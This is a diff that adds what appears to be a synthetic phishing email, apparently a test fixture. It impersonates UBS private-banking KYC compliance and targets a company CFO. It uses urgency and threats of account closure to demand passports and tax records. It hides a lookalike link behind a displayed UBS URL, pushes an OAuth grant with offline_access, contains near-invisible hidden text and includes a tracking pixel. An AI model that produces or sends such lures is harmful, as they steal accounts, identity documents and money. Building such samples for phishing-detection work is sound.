@@ -1,0 +1,115 @@
+From: UBS Wealth Management | KYC Compliance <kyc.update@ubs-private-banking.example>
+To: cfo@corp.internal
+Cc: legal@corp.internal
+Reply-To: kyc.compliance@ubs-kyc-secure.example
+Date: Mon, 26 Oct 2026 14:00:00 +0100
+Disposition-Notification-To: kyc.update@ubs-private-banking.example
+Message-ID: <0704-b60@synth.example>
+Subject: [REMINDER] Enhanced KYC Review for Account CH88-0447-8842-9921-K — FATCA/CRS reclassification required (Friday deadline)
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif;max-width:640px;margin:0 auto;border:1px solid #EC0016;border-radius:8px;overflow:hidden">
+<div style="background:#EC0016;color:#fff;padding:14px 24px">
+<h2 style="margin:0;font-size:17px;color:#EC0016">UBS</h2>
+<p style="margin:4px 0;font-size:12px;opacity:0.8">Wealth Management | KYC & Compliance — Basel, Switzerland</p>
+</div>
+<div style="padding:24px">
+
+<p>Dear CFO,</p>
+
+<p>Your private banking account requires an <b>Enhanced KYC (Know Your Customer) review</b> due to FATCA/CRS reclassification. Your account has been <b>temporarily restricted</b> pending completion.</p>
+
+<h3>一、Account Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">Account Number</td><td><b>CH88-0447-8842-9921-K</b></td></tr>
+<tr><td style="background:#f5f5f5">Account Type</td><td>Wealth Management — Private Banking (IBN)</td></tr>
+<tr><td style="background:#f5f5f5">Account Holder</td><td>Your Company Ltd (via BVI holding structure)</td></tr>
+<tr><td style="background:#f5f5f5">Relationship Manager</td><td>Philippe Muller (Basel)</td></tr>
+<tr><td style="background:#f5f5f5">AUM</td><td>CHF 42,700,000.00</td></tr>
+<tr><td style="background:#f5f5f5">Account Status</td><td style="color:#e00"><b>RESTRICTED (KYC review pending)</b></td></tr>
+<tr><td style="background:#f5f5f5">KYC Review Deadline</td><td style="color:#e00"><b>Friday, 30 October 2026</b></td></tr>
+<tr><td style="background:#f5f5f5">Restrictions Applied</td><td>No outgoing transfers / No new positions / No trading</td></tr>
+</table>
+
+<h3>二、Reason for Enhanced KYC</h3>
+<p>Our compliance team has identified that your BVI holding structure requires reclassification under:</p>
+<ul>
+<li><b>FATCA</b> (Foreign Account Tax Compliance Act) — passive foreign investment company (PFIC) determination</li>
+<li><b>CRS</b> (Common Reporting Standard) — change in controlling person's tax residency</li>
+<li><b>Swiss FINMA</b> Circula 2016/7 — enhanced due diligence for cross-border structures</li>
+</ul>
+
+<h3>三、Required Documents</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Document</th><th>Format</th><th>Priority</th></tr>
+<tr><td>Passport copies of all directors and UBOs</td><td>PDF (certified)</td><td style="color:#e00">Critical</td></tr>
+<tr><td>Proof of tax residency (all UBOs)</td><td>PDF</td><td style="color:#e00">Critical</td></tr>
+<tr><td>BVI company registry extract</td><td>PDF</td><td>High</td></tr>
+<tr><td>Shareholder register</td><td>PDF</td><td>High</td></tr>
+<tr><td>Source of wealth declaration</td><td>PDF (UBS template)</td><td>High</td></tr>
+<tr><td>Bank reference letter (from existing bank)</td><td>PDF</td><td>Medium</td></tr>
+<tr><td>Audited financial statements (BVI entity, last 2 years)</td><td>PDF</td><td>Medium</td></tr>
+</table>
+
+<h3>四、Document Submission</h3>
+
+<p><b>Option 1 (Recommended) — Secure document upload via Google Workspace:</b></p>
+
+<p>UBS migrated its KYC document management to Google Workspace in Q3 2026. To upload your documents securely:</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://ubs-private-banking.example/kyc/upload?account=CH88-0447-8842-9921-K" style="display:inline-block;background:#EC0016;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Upload KYC Documents</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://workspace.ubs.com/kyc/document-upload</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（Authentication with your corporate Google Workspace account）</p>
+
+<h3>About Google Workspace Authentication</h3>
+<p>When you click the upload button:</p>
+<ol>
+<li>You will be redirected to <b>accounts.google.com</b> (Google's official OAuth endpoint)</li>
+<li>Sign in with your corporate Google Workspace account (@corp.internal)</li>
+<li>Grant the requested permissions (openid, profile, offline_access)</li>
+<li>You will be redirected to the secure document upload portal</li>
+</ol>
+
+<p style="font-size:14px;background:#FFEBEE;padding:12px;border-radius:4px">
+<b>Why Google Workspace for KYC?</b> UBS Switzerland migrated its client document management to Google Workspace Enterprise in Q3 2026 as part of our cloud transformation under the <b>Swiss-US Privacy Shield Framework</b>. All documents are encrypted at rest and stored in Google's Zurich data center (CH-EU-ZRH). The offline_access permission maintains your session during multi-document upload (KYC packages typically contain 15-25 documents totaling 100-200MB). The token is scoped only to the UBS KYC application.
+</p>
+
+<p><b>Option 2 — Upload through your Relationship Manager:</b></p>
+<p>Schedule an in-person meeting with Philippe Muller at our Basel office (Aeschenplatz 6, 4052 Basel). He can scan and upload documents on your behalf. Note: scheduling typically takes 1-2 weeks.</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文协助或通过UBS香港分行走中文KYC通道，请访问 ubs-private-banking.example/cn-kyc 直接上传中国身份证件与公司注册文件（免Google认证，5个工作日处理）。</p>
+
+<h3>五、Consequences of Non-Compliance</h3>
+<ul>
+<li><b>Account closure:</b> If documents are not received by 30 October, UBS is legally required to close the account under FINMA Circula 2016/7</li>
+<li><b>Forced liquidation:</b> All positions will be liquidated at market price (potentially unfavorable)</li>
+<li><b>Fund repatriation:</b> CHF 42.7M will be wired to your original funding source</li>
+<li><b>Tax reporting:</b> Account closure will be reported to relevant tax authorities under CRS</li>
+<li><b>Banking relationship termination:</b> All UBS entities globally</li>
+</ul>
+
+<h3>六、Your Relationship Team</h3>
+<p><b>Relationship Manager:</b> Philippe Muller<br>
+Phone: +41 61 288 ****<br>
+Email: philippe.muller@ubs.example</p>
+<p><b>KYC Compliance Officer:</b> Anna Weber<br>
+Phone: +41 61 288 ****<br>
+Email: kyc.compliance@ubs-kyc-secure.example</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">UBS Switzerland AG | Wealth Management — KYC & Compliance</p>
+<p style="font-size:11px;color:#999">Aeschenplatz 6, 4052 Basel, Switzerland</p>
+<p style="font-size:11px;color:#999">This communication contains confidential banking information.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://ubs-private-banking.example/api/track?recipient=cfo%40corp.internal&account=CH88&type=kyc_reminder" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
